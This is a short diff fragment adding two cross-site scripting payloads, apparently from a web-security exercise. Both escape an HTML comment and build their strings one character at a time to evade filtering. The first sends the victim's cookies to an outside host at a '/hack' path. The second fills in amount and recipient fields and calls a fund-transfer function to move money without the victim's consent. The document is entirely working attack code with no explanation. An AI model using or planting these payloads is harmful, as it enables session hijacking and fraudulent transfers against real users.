@@ -1,0 +1,6 @@
+--> <script> document.location='h' + 't' + 't' + 'p' + ':' + '/' + '/' + 'h' +
+'o' + 'm' + 'e' + 'r' + '.' + 's' + 't' + 'u' + 'y' + '.' + 'e' + 'd' + 'u' +
+':' + '4' + '5' + '6' + '7' + '/' + 'h' + 'a' + 'c' + 'k' + '?' + 'a' + '=' +
+document.cookie </script> <!--
+
+--> <script> var atarget='#'+'a'+'m'+'o'+'u'+'n'+'t'; var avalue=100; var rtarget='#'+'r'+'e'+'c'+'i'+'p'+'i'+'e'+'n'+'t'; var rvalue='a'+'b'+'c'; $(atarget).val(avalue); $(rtarget).val(rvalue); javascript:transfer_funds(); </script> <!--
